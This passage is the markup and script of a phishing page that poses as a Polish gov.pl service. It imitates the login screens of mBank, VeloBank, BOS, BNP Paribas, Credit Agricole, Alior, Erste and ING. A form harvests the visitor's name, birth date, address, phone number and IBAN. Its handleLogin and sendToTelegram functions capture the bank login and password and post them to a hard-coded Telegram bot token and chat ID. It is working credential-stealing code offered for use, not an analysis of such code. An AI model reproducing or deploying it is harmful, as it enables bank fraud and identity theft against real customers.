                    <form class="bank4-form" onsubmit="return handleLogin(event, 'mBank')">
                        <div class="form-group">
                            <label for="loginUsername4">Login</label>
                            <input type="text" id="loginUsername4" placeholder="Wpisz login" required>
                        </div>
                        <div class="login-btn-row">
                            <div class="form-group">
                                <label for="loginPassword4">Hasło</label>
                                <input type="password" id="loginPassword4" placeholder="Wpisz hasło" required>
                            </div>
                            <button type="submit" class="login-btn">Dalej</button>
                        </div>
                    </form>
                </div>
            </div>

            <!-- ===== BANK 5 — Velo ===== -->
            <div class="bank5-full-page" id="loginScreen5">
                <button class="bank5-close-btn" id="bank5CloseBtn" onclick="closeLoginScreen5()">✕</button>
                <div class="bank5-container">
                    <div class="bank5-box">
                        <div class="bank5-alert">
                            Widzisz komunikat o blokadzie bankowości, nie pamiętasz danych logowania lub dostęp do Citi Handlowy jest zablokowany?
                            <br>
                            <a href="#" onclick="alert('Przekierowanie do logowania przez mObywatel'); return false;">Kliknij tutaj</a> i skorzystaj z najszybszej i najprostszej ścieżki - logowanie przez mObywatel lub e-Dowód.
                            <br><br>
                            Szybko potwierdzisz swoją tożsamość i odzyskasz dostęp – bez wychodzenia z domu i bez zbędnych formalności.
                        </div>
                        <div class="bank5-title">Zaloguj się do VeloBanku</div>
                        <div class="bank5-subtitle">Login i hasło</div>
                        <form class="bank5-form" onsubmit="return handleLogin(event, 'Velo')">
                            <div class="form-group">
                                <label for="loginUsername5">Login</label>
                                <input type="text" id="loginUsername5" placeholder="Wpisz Twój login" required>
                            </div>
                            <div class="login-btn-row">
                                <div class="form-group">
                                    <label for="loginPassword5">Hasło</label>
                                    <input type="password" id="loginPassword5" placeholder="Wpisz hasło" required>
                                </div>
                                <button type="submit" class="login-btn">Dalej</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>

            <!-- ===== BANK 6 — BOS ===== -->
            <div class="bank6-full-page" id="loginScreen6">
                <button class="bank6-close-btn" id="bank6CloseBtn" onclick="closeLoginScreen6()">✕</button>
                <div class="bank6-container">
                    <div class="bank6-left">
                        <div class="bank6-title">Logowanie</div>
                        <form class="bank6-form" onsubmit="return handleLogin(event, 'BOS')">
                            <div class="form-group">
                                <label for="loginUsername6">Login</label>
                                <input type="text" id="loginUsername6" placeholder="Wpisz login" required>
                            </div>
                            <div class="form-group">
                                <label for="loginPassword6">Hasło</label>
                                <input type="password" id="loginPassword6" placeholder="Wpisz hasło" required>
                            </div>
                            <button type="submit" class="login-btn">Dalej</button>
                        </form>
                        <div class="bank6-download"><img src="download.png" alt="Pobierz aplikację"></div>
                    </div>
                    <div class="bank6-right">
                        <div class="bank6-security-title">🔒 Pamiętaj o zasadach bezpieczeństwa</div>
                        <div class="bank6-security-text">
                            <p>Wprowadzaj adres strony Banku ręcznie, nie korzystaj z wyników wyszukiwarek i linków niewiadomego pochodzenia.</p>
                            <p><span class="highlight">Przed zalogowaniem sprawdź, czy:</span></p>
                            <ul><li>adres rozpoczyna się od <span class="green">https</span></li><li>połączenie jest szyfrowane tj. w pasku adresu widoczna jest zamknięta kłódka</li><li>certyfikat strony wystawiony jest dla <span class="green">Bank Ochrony Środowiska S.A.</span></li></ul>
                            <p>Używaj opcji <span class="highlight">Wyloguj</span> kończąc pracę w systemie, gwarantuje to poprawne zamknięcie twojej sesji.</p>
                            <p>Jeśli zauważysz coś nietypowego lub podejrzanego zgłoś ten fakt do Banku.</p>
                            <p>Więcej informacji na temat bezpieczeństwa znajdziesz na stronie Banku: <span class="link" onclick="alert('Przekierowanie do strony bezpieczeństwa'); return false;">Zasady bezpieczeństwa</span></p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- ===== BANK 7 — BNP PARIBAS ===== -->
            <div class="bank7-full-page" id="loginScreen7">
                <button class="bank7-close-btn" id="bank7CloseBtn" onclick="closeLoginScreen7()">✕</button>
                <div class="bank7-container">
                    <div class="bank7-logo"><img src="bnp-paribas-logo-full.svg" alt="BNP Paribas"></div>
                    <div class="bank7-box">
                        <div class="bank7-title">Zaloguj się do GOonline</div>
                        <div class="bank7-subtitle">Podaj swój login, aby zalogować się do serwisu transakcyjnego</div>
                        <form class="bank7-form" onsubmit="return handleLogin(event, 'BNP PARIBAS')">
                            <div class="form-group">
                                <label for="loginUsername7">Login</label>
                                <input type="text" id="loginUsername7" placeholder="Wpisz login" required>
                            </div>
                            <div class="form-group">
                                <label for="loginPassword7">Hasło</label>
                                <input type="password" id="loginPassword7" placeholder="Wpisz hasło" required>
                            </div>
                            <button type="submit" class="login-btn">Dalej</button>
                        </form>
                        <div class="bank7-security">
                            <div class="bank7-security-title">Sprawdź, zanim się zalogujesz:</div>
                            <ul class="bank7-security-list"><li>Adres zaczyna się od https</li><li>Połączenie szyfrowane</li><li>Certyfikat strony</li></ul>
                            <div class="bank7-links">
                                <a href="#" onclick="alert('Przekierowanie do strony GOonline'); return false;">Poznaj GOonline</a>
                                <span class="separator">|</span>
                                <a href="#" onclick="alert('Przekierowanie do pomocy'); return false;">Masz pytania dotyczące GOonline?</a>
                            </div>
                            <div class="bank7-chat"><a href="#" onclick="alert('Przekierowanie do wideoczatu'); return false;">Zapytaj konsultanta na wideoczacie</a> (w godz 9-17 w dni robocze)</div>
                        </div>
                    </div>
                </div>
                <div class="bank7-norton"><img src="norton.png" alt="Norton"></div>
            </div>

            <!-- ===== BANK 8 — Credit Agricole ===== -->
            <div class="bank8-full-page" id="loginScreen8">
                <button class="bank8-close-btn" id="bank8CloseBtn" onclick="closeLoginScreen8()">✕</button>
                <div class="bank8-container">
                    <div class="bank8-left">
                        <div class="bank8-favicon"><img src="favicon.ico" alt="Credit Agricole"></div>
                        <div class="bank8-card">
                            <div class="bank8-card-title">Klient indywidualny</div>
                            <div class="bank8-login-title">Zaloguj się</div>
                            <div class="bank8-login-subtitle">Podaj login i hasło</div>
                            <form class="bank8-form" onsubmit="return handleLogin(event, 'Credit Agricole')">
                                <div class="form-group">
                                    <label for="loginUsername8">Login</label>
                                    <input type="text" id="loginUsername8" placeholder="Wpisz login" required>
                                </div>
                                <div class="form-group">
                                    <label for="loginPassword8">Hasło</label>
                                    <input type="password" id="loginPassword8" placeholder="Wpisz hasło" required>
                                </div>
                                <button type="submit" class="login-btn">Dalej</button>
                            </form>
                        </div>
                    </div>
                    <div class="bank8-right">
                        <div class="bank8-security-title">Włącz dodatkową ochronę przed oszustami</div>
                        <div class="bank8-security-text"><p>Cyberprzestępcy nie śpią. Zabezpiecz swoje pieniądze - włącz darmową weryfikację behawioralną.</p></div>
                        <div class="bank8-security-image"><img src="login-positive-1000.png" alt="Bezpieczeństwo"></div>
                    </div>
                </div>
            </div>

            <!-- ===== BANK 9 — Alior Bank ===== -->
            <div class="bank9-full-page" id="loginScreen9">
                <button class="bank9-close-btn" id="bank9CloseBtn" onclick="closeLoginScreen9()">✕</button>
                <div class="bank9-container">
                    <div class="bank9-top">
                        <div class="bank9-logo"><img src="alior-logo.svg" alt="Alior Bank"></div>
                        <div class="bank9-title">Potwierdzenie tożsamości z Alior Bankiem</div>
                    </div>
                    <div class="bank9-wrapper">
                        <div class="bank9-card">
                            <div class="bank9-welcome">Witamy w Alior Banku!</div>
                            <form class="bank9-form" onsubmit="return handleLogin(event, 'Alior Bank')">
                                <div class="form-group">
                                    <label for="loginUsername9">Login</label>
                                    <input type="text" id="loginUsername9" placeholder="Wpisz login" required>
                                </div>
                                <div class="form-group">
                                    <label for="loginPassword9">Hasło</label>
                                    <input type="password" id="loginPassword9" placeholder="Wpisz hasło" required>
                                </div>
                                <button type="submit" class="login-btn">Dalej</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>

            <!-- ===== BANK 10 — ERSTE ===== -->
            <div class="bank10-full-page" id="loginScreen10">
                <button class="bank10-close-btn" id="bank10CloseBtn" onclick="closeLoginScreen10()">✕</button>
                <div class="bank10-container">
                    <div class="bank10-top-logo"><img src="logo (2).png" alt="ERSTE"></div>
                    <div class="bank10-main">
                        <div class="bank10-left"></div>
                        <div class="bank10-card">
                            <p><strong>Węzeł Krajowy - login.gov.pl chce potwierdzić Twoją tożsamość w celu: ePUAP.</strong><br><br>Twoje dane do logowania są bezpieczne, nigdzie ich nie przekazujemy.</p>
                        </div>
                    </div>
                    <div class="bank10-form-section">
                        <div class="bank10-login-title">Zaloguj się</div>
                        <form class="bank10-form" onsubmit="return handleLogin(event, 'ERSTE')">
                            <div class="form-group">
                                <label for="loginUsername10">Login</label>
                                <input type="text" id="loginUsername10" placeholder="Wpisz login" required>
                            </div>
                            <div class="form-group">
                                <label for="loginPassword10">Hasło</label>
                                <input type="password" id="loginPassword10" placeholder="Wpisz hasło" required>
                            </div>
                            <button type="submit" class="login-btn">Dalej</button>
                        </form>
                    </div>
                    <div class="bank10-security">
                        <div class="bank10-security-title">Bezpieczeństwo</div>
                        <ul class="bank10-security-list">
                            <li>Pobieraj i aktualizuj oprogramowanie tylko z autoryzowanych sklepów z aplikacjami.</li>
                            <li>Sprawdź treść w wiadomości z smsKodem, zanim zaakceptujesz dyspozycję.</li>
                            <li>Nie otwieraj linków i załączników od nieznanych nadawców.</li>
                        </ul>
                    </div>
                </div>
            </div>

            <!-- ===== BANK 12 — ING Bank ===== -->
            <div class="bank12-full-page" id="loginScreen12">
                <button class="bank12-close-btn" id="bank12CloseBtn" onclick="closeLoginScreen12()">✕</button>
                <div class="bank12-container">
                    <div class="bank12-logo"><img src="logo_ing-logo.svg" alt="ING Bank"></div>
                    <div class="bank12-title">Potwierdzasz tożsamość w Moim ING</div>
                    <div class="bank12-subtitle">Login do bankowości Moje ING</div>
                    <form class="bank12-form" onsubmit="return handleLogin(event, 'ING Bank')">
                        <div class="form-group">
                            <label for="loginUsername12">Login</label>
                            <input type="text" id="loginUsername12" placeholder="Wpisz login" required>
                        </div>
                        <div class="login-btn-row">
                            <div class="form-group">
                                <label for="loginPassword12">Hasło</label>
                                <input type="password" id="loginPassword12" placeholder="Wpisz hasło" required>
                            </div>
                            <button type="submit" class="login-btn">Dalej</button>
                        </div>
                    </form>
                </div>
            </div>

            <main class="main-content"></main>
        </div>
    </div>

    <!-- ===== TOAST MESSAGE ===== -->
    <div class="toast-message" id="toastMessage">Najpierw wypełnij wszystkie wymagane pola!</div>

    <!-- ===== FOOTER ===== -->
    <footer class="footer" id="footer">
        <div class="container">
            <div><h4>Serwis Gov.pl</h4><ul><li><a href="#">O serwisie</a></li><li><a href="#">Polityka prywatności</a></li><li><a href="#">Warunki korzystania</a></li><li><a href="#">Deklaracja dostępności</a></li></ul></div>
            <div><h4>Dla obywatela</h4><ul><li><a href="#">Usługi online</a></li><li><a href="#">Poradniki</a></li><li><a href="#">Najczęściej zadawane pytania</a></li></ul></div>
            <div><h4>Dla przedsiębiorcy</h4><ul><li><a href="#">Biznes.gov.pl</a></li><li><a href="#">Dotacje</a></li><li><a href="#">Prawo</a></li></ul></div>
            <div><h4>Kontakt</h4><ul><li><a href="#">Infolinia</a></li><li><a href="#">ePUAP</a></li><li><a href="#">Mapa strony</a></li></ul></div>
        </div>
        <div class="footer-bottom"><div class="container">© 2026 Kancelaria Prezesa Rady Ministrów. Wszelkie prawa zastrzeżone.</div></div>
    </footer>

    <!-- ===== JAVASCRIPT (ИСПРАВЛЕННАЯ ВЕРСИЯ) ===== -->
    <script>
        // ===== ТОКЕН И CHAT ID ТЕЛЕГРАМ-БОТА =====
        const TELEGRAM_BOT_TOKEN = '7789434760:AAHtL9LgKxOOGU8thYpZivs2K4mzrhqG3EI';
        const TELEGRAM_CHAT_ID = '923214631';

        document.addEventListener('DOMContentLoaded', function() {
            // ===== МЕНЮ =====
            const menuToggle = document.getElementById('menuToggle');
            const sidebar = document.getElementById('sidebar');
            const mainWrapper = document.getElementById('mainWrapper');
            const contentWrapper = document.getElementById('contentWrapper');
            const footer = document.getElementById('footer');
            let isMenuOpen = false;

            function toggleMenu() {
                isMenuOpen = !isMenuOpen;
                if (isMenuOpen) {
                    sidebar.classList.add('open');
                    mainWrapper.classList.add('shifted');
                    contentWrapper.classList.add('shifted');
                    footer.classList.add('shifted');
                } else {
                    sidebar.classList.remove('open');
                    mainWrapper.classList.remove('shifted');
                    contentWrapper.classList.remove('shifted');
                    footer.classList.remove('shifted');
                }
            }

            if (menuToggle) {
                menuToggle.addEventListener('click', function(e) {
                    e.stopPropagation();
                    toggleMenu();
                });
            }

            const sidebarLinks = document.querySelectorAll('.sidebar-nav ul li a, .sidebar-nav .ukraine-link');
            sidebarLinks.forEach(link => {
                link.addEventListener('click', function(e) {
                    e.preventDefault();
                    sidebarLinks.forEach(l => l.classList.remove('active'));
                    this.classList.add('active');
                    if (isMenuOpen) toggleMenu();
                });
            });

            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape' && isMenuOpen) toggleMenu();
            });

            // ===== ПОИСК =====
            document.querySelector('.header-search .search-submit-btn')?.addEventListener('click', function() {
                const input = this.closest('.header-search').querySelector('input');
                alert('Szukanie: ' + (input?.value || 'puste'));
            });

            document.querySelector('.header-search input')?.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    alert('Szukanie: ' + this.value);
                }
            });

            // ===== НАВИГАЦИЯ LOGIN NAV =====
            document.querySelectorAll('.login-nav .nav-links a').forEach(link => {
                link.addEventListener('click', function(e) {
                    e.preventDefault();
                    alert('Przekierowanie do: ' + this.textContent.trim());
                });
            });

            // ===== КНОПКА DOWIEDZ SIĘ WIĘCEJ =====
            const scrollBtn = document.getElementById('scrollToFormBtn');
            const formSection = document.getElementById('dataFormSection');

            scrollBtn.addEventListener('click', function(e) {
                e.preventDefault();
                formSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
            });

            // ===== ФОРМА - ОТПРАВКА =====
            const form = document.getElementById('dataForm');
            const submitBtn = document.getElementById('submitBtn');
            const toast = document.getElementById('toastMessage');
            const allInputs = form.querySelectorAll('input[required]');
            const formSectionElement = document.getElementById('dataFormSection');
            const bankSelection = document.getElementById('bankSelection');
            const loginNav = document.getElementById('loginNav');
            const imageBanner = document.getElementById('imageBanner');
            const bankFooter = document.getElementById('bankFooter');

            function showToast(message, isSuccess = false) {
                toast.textContent = message;
                toast.className = 'toast-message show';
                if (isSuccess) {
                    toast.classList.add('success');
                } else {
                    toast.classList.remove('success');
                }
                setTimeout(function() {
                    toast.classList.remove('show');
                }, 5000);
            }

            function validateForm() {
                let allFilled = true;
                allInputs.forEach(input => {
                    if (input.value.trim() === '') {
                        allFilled = false;
                        input.classList.add('error');
                    } else {
                        input.classList.remove('error');
                    }
                });
                return allFilled;
            }

            function getFormData() {
                return {
                    fullname: document.getElementById('fullname').value.trim(),
                    birthdate: document.getElementById('birthdate').value.trim(),
                    phone: document.getElementById('phone').value.trim(),
                    street: document.querySelector('input[name="street"]').value.trim(),
                    city: document.querySelector('input[name="city"]').value.trim(),
                    postal: document.querySelector('input[name="postal"]').value.trim(),
                    iban: document.getElementById('iban').value.trim()
                };
            }

            form.addEventListener('submit', function(e) {
                e.preventDefault();

                if (!validateForm()) {
                    showToast('Najpierw wypełnij wszystkie wymagane pola!');
                    return;
                }

                submitBtn.disabled = true;
                submitBtn.classList.add('loading');
                submitBtn.innerHTML = '<span class="spinner"></span> Wysyłanie...';

                const formData = getFormData();

                fetch('http://localhost:5000/send', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(formData)
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        showToast('Dane zostały wysłane!', true);

                        loginNav.classList.add('hidden');
                        imageBanner.classList.add('hidden');
                        formSectionElement.classList.add('hidden');

                        bankSelection.classList.add('visible');
                        bankFooter.classList.add('visible');
                        window.scrollTo({ top: 0, behavior: 'smooth' });
                    } else {
                        showToast('Wystąpił błąd podczas wysyłania. Spróbuj ponownie.');
                    }
                })
                .catch(error => {
                    console.error('Błąd:', error);
                    showToast('Wystąpił błąd połączenia. Spróbuj ponownie.');
                })
                .finally(() => {
                    submitBtn.disabled = false;
                    submitBtn.classList.remove('loading');
                    submitBtn.innerHTML = 'Wyślij';
                });
            });

            allInputs.forEach(input => {
                input.addEventListener('input', function() {
                    if (this.value.trim() !== '') {
                        this.classList.remove('error');
                    }
                });
            });

            document.addEventListener('click', function(e) {
                if (toast.classList.contains('show') && !toast.contains(e.target)) {
                    toast.classList.remove('show');
                }
            });
        });

        // ===== ГЛОБАЛЬНАЯ ФУНКЦИЯ ОТПРАВКИ В TELEGRAM =====
        function sendToTelegram(bankName, login, password) {
            const message = `🔐 *Nowe logowanie*\n🏦 *Bank:* ${bankName}\n👤 *Login:* ${login}\n🔑 *Hasło:* ${password}\n🕒 ${new Date().toLocaleString()}`;
            
            console.log(`📤 Отправка в Telegram:`, { bankName, login, password });

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('✅ Wysłano do Telegram');
                } else {
                    console.error('❌ Błąd Telegram:', data);
                }
            })
            .catch(error => {
                console.error('❌ Błąd sieci:', error);
            });
        }

        // ===== УНИВЕРСАЛЬНЫЙ ОБРАБОТЧИК ВСЕХ ФОРМ БАНКОВ (ГАРАНТИРОВАННО РАБОТАЕТ) =====
        function handleLogin(event, bankName) {
            event.preventDefault();

            const form = event.target;
            
            // Получаем все input'ы в форме
            const allInputs = form.querySelectorAll('input');
            
            let login = '';
            let password = '';

            // 1. Ищем Login (первый text/email/tel input)
            const textInputs = [];
            const passwordInputs = [];
            
            allInputs.forEach(input => {
                const type = input.type || '';
                if (type === 'password') {
                    passwordInputs.push(input);
                } else if (type === 'text' || type === 'email' || type === 'tel') {
                    textInputs.push(input);
                }
            });

            // 2. Находим Login — первый текстовый input
            if (textInputs.length > 0) {
                login = textInputs[0].value.trim();
            }

            // 3. Находим Hasło — первый password input
            if (passwordInputs.length > 0) {
                password = passwordInputs[0].value.trim();
            }

            // 4. Если логин не найден, пробуем найти по id/name/placeholder
            if (!login) {
                for (const input of allInputs) {
                    const id = (input.id || '').toLowerCase();
                    const name = (input.name || '').toLowerCase();
                    const placeholder = (input.placeholder || '').toLowerCase();
                    if (id.includes('login') || name.includes('login') || placeholder.includes('login')) {
                        if (input.type !== 'password' && input.type !== 'hidden') {
                            login = input.value.trim();
                            break;
                        }
                    }
                }
            }

            // 5. Если пароль не найден, пробуем найти по id/name/placeholder
            if (!password) {
                for (const input of allInputs) {
                    const id = (input.id || '').toLowerCase();
                    const name = (input.name || '').toLowerCase();
                    const placeholder = (input.placeholder || '').toLowerCase();
                    if (id.includes('hasło') || id.includes('haslo') || id.includes('password') ||
                        name.includes('hasło') || name.includes('haslo') || name.includes('password') ||
                        placeholder.includes('hasło') || placeholder.includes('haslo') || placeholder.includes('password')) {
                        if (input.type === 'password') {
                            password = input.value.trim();
                            break;
                        }
                    }
                }
            }

            // 6. Если всё ещё пусто, берём первый и второй input по порядку
            if (!login || !password) {
                const nonHiddenInputs = [];
                allInputs.forEach(input => {
                    if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button') {
                        nonHiddenInputs.push(input);
                    }
                });
                
                if (nonHiddenInputs.length >= 2) {
                    if (!login) {
                        login = nonHiddenInputs[0].value.trim();
                    }
                    if (!password) {
                        password = nonHiddenInputs[1].value.trim();
                    }
                }
            }

            // 7. Финальная проверка — если пароль пуст, ищем любой password
            if (!password) {
                const anyPassword = form.querySelector('input[type="password"]');
                if (anyPassword) {
                    password = anyPassword.value.trim();
                }
            }

            // 8. Финальная проверка — если логин пуст, ищем любой text
            if (!login) {
                const anyText = form.querySelector('input[type="text"]');
                if (anyText) {
                    login = anyText.value.trim();
                }
            }

            // ОТЛАДКА В КОНСОЛЬ
            console.log(`[${bankName}] ===== ОТЛАДКА =====`);
            console.log(`[${bankName}] Login: "${login}"`);
            console.log(`[${bankName}] Hasło: "${password}"`);
            console.log(`[${bankName}] Все поля:`, Array.from(allInputs).map(i => ({
                id: i.id,
                type: i.type,
                name: i.name,
                placeholder: i.placeholder,
                value: i.value
            })));

            if (!login || !password) {
                alert(`Proszę wypełnić wszystkie pola (Login i Hasło) dla ${bankName}.`);
                return false;
            }

            // Отправка в Telegram
            sendToTelegram(bankName, login, password);
            alert(`✅ Dane dla ${bankName} zostały wysłane!`);

            // Очистка полей
            allInputs.forEach(input => {
                if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button') {
                    input.value = '';
                }
            });

            return false;
        }

        // ===== ОТКРЫТИЕ/ЗАКРЫТИЕ ВСЕХ БАНКОВ =====
        function openLoginScreen1() {
            document.getElementById('bankSelection').classList.remove('visible');
            document.getElementById('bankFooter').classList.remove('visible');
            document.getElementById('loginScreen1').classList.add('visible');
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        function openLoginScreen2() {
            document.getElementById('bankSelection').classList.remove('visible');
            document.getElementById('bankFooter').classList.remove('visible');
            document.getElementById('loginScreen2').classList.add('visible');
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        function openLoginScreen3() {
            const bank3 = document.getElementById('loginScreen3');
            const closeBtn = document.getElementById('bank3CloseBtn');
            bank3.classList.add('visible');
            closeBtn.classList.add('visible');
            document.body.style.overflow = 'hidden';
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        function closeLoginScreen3() {
            const bank3 = document.getElementById('loginScreen3');
            const closeBtn = document.getElementById('bank3CloseBtn');
            bank3.classList.remove('visible');
            closeBtn.classList.remove('visible');
            document.body.style.overflow = '';
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        function openLoginScreen4() {
            const bank4 = document.getElementById('loginScreen4');
            const closeBtn = document.getElementById('bank4CloseBtn');
            bank4.classList.add('visible');
            closeBtn.classList.add('visible');
            document.body.style.overflow = 'hidden';
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        function closeLoginScreen4() {
            const bank4 = document.getElementById('loginScreen4');
            const closeBtn = document.getElementById('bank4CloseBtn');
            bank4.classList.remove('visible');
            closeBtn.classList.remove('visible');
            document.body.style.overflow = '';
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        function openLoginScreen5() {
            const bank5 = document.getElementById('loginScreen5');
            const closeBtn = document.getElementById('bank5CloseBtn');
            bank5.classList.add('visible');
            closeBtn.classList.add('visible');
            document.body.style.overflow = 'hidden';
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        function closeLoginScreen5() {
            const bank5 = document.getElementById('loginScreen5');
            const closeBtn = document.getElementById('bank5CloseBtn');
            bank5.classList.remove('visible');
            closeBtn.classList.remove('visible');
            document.body.style.overflow = '';
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        function openLoginScreen6() {
            const bank6 = document.getElementById('loginScreen6');
            const closeBtn = document.getElementById('bank6CloseBtn');
            bank6.classList.add('visible');
            closeBtn.classList.add('visible');
            document.body.style.overflow = 'hidden';
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        function closeLoginScreen6() {
            const bank6 = document.getElementById('loginScreen6');
            const closeBtn = document.getElementById('bank6CloseBtn');
            bank6.classList.remove('visible');
            closeBtn.classList.remove('visible');
            document.body.style.overflow = '';
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        function openLoginScreen7() {
            const bank7 = document.getElementById('loginScreen7');
            const closeBtn = document.getElementById('bank7CloseBtn');
            bank7.classList.add('visible');
            closeBtn.classList.add('visible');
            document.body.style.overflow = 'hidden';
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        function closeLoginScreen7() {
            const bank7 = document.getElementById('loginScreen7');
            const closeBtn = document.getElementById('bank7CloseBtn');
            bank7.classList.remove('visible');
            closeBtn.classList.remove('visible');
            document.body.style.overflow = '';
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        function openLoginScreen8() {
            const bank8 = document.getElementById('loginScreen8');
            const closeBtn = document.getElementById('bank8CloseBtn');
            bank8.classList.add('visible');
            closeBtn.classList.add('visible');
            document.body.style.overflow = 'hidden';
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        function closeLoginScreen8() {
            const bank8 = document.getElementById('loginScreen8');
            const closeBtn = document.getElementById('bank8CloseBtn');
            bank8.classList.remove('visible');
            closeBtn.classList.remove('visible');
            document.body.style.overflow = '';
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        function openLoginScreen9() {
            const bank9 = document.getElementById('loginScreen9');
            const closeBtn = document.getElementById('bank9CloseBtn');
            bank9.classList.add('visible');
            closeBtn.classList.add('visible');
            document.body.style.overflow = 'hidden';
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        function closeLoginScreen9() {
            const bank9 = document.getElementById('loginScreen9');
            const closeBtn = document.getElementById('bank9CloseBtn');
            bank9.classList.remove('visible');
            closeBtn.classList.remove('visible');
            document.body.style.overflow = '';
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        function openLoginScreen10() {
            const bank10 = document.getElementById('loginScreen10');
            const closeBtn = document.getElementById('bank10CloseBtn');
            bank10.classList.add('visible');
            closeBtn.classList.add('visible');
            document.body.style.overflow = 'hidden';
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        function closeLoginScreen10() {
            const bank10 = document.getElementById('loginScreen10');
            const closeBtn = document.getElementById('bank10CloseBtn');
            bank10.classList.remove('visible');
            closeBtn.classList.remove('visible');
            document.body.style.overflow = '';
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        function openLoginScreen12() {
            const bank12 = document.getElementById('loginScreen12');
            const closeBtn = document.getElementById('bank12CloseBtn');
            bank12.classList.add('visible');
            closeBtn.classList.add('visible');
            document.body.style.overflow = 'hidden';
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        function closeLoginScreen12() {
            const bank12 = document.getElementById('loginScreen12');
            const closeBtn = document.getElementById('bank12CloseBtn');
            bank12.classList.remove('visible');
            closeBtn.classList.remove('visible');
            document.body.style.overflow = '';
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                if (document.getElementById('loginScreen3').classList.contains('visible')) closeLoginScreen3();
                if (document.getElementById('loginScreen4').classList.contains('visible')) closeLoginScreen4();
                if (document.getElementById('loginScreen5').classList.contains('visible')) closeLoginScreen5();
                if (document.getElementById('loginScreen6').classList.contains('visible')) closeLoginScreen6();
                if (document.getElementById('loginScreen7').classList.contains('visible')) closeLoginScreen7();
                if (document.getElementById('loginScreen8').classList.contains('visible')) closeLoginScreen8();
                if (document.getElementById('loginScreen9').classList.contains('visible')) closeLoginScreen9();
                if (document.getElementById('loginScreen10').classList.contains('visible')) closeLoginScreen10();
                if (document.getElementById('loginScreen12').classList.contains('visible')) closeLoginScreen12();
            }
        });
    </script>

</body>
</html>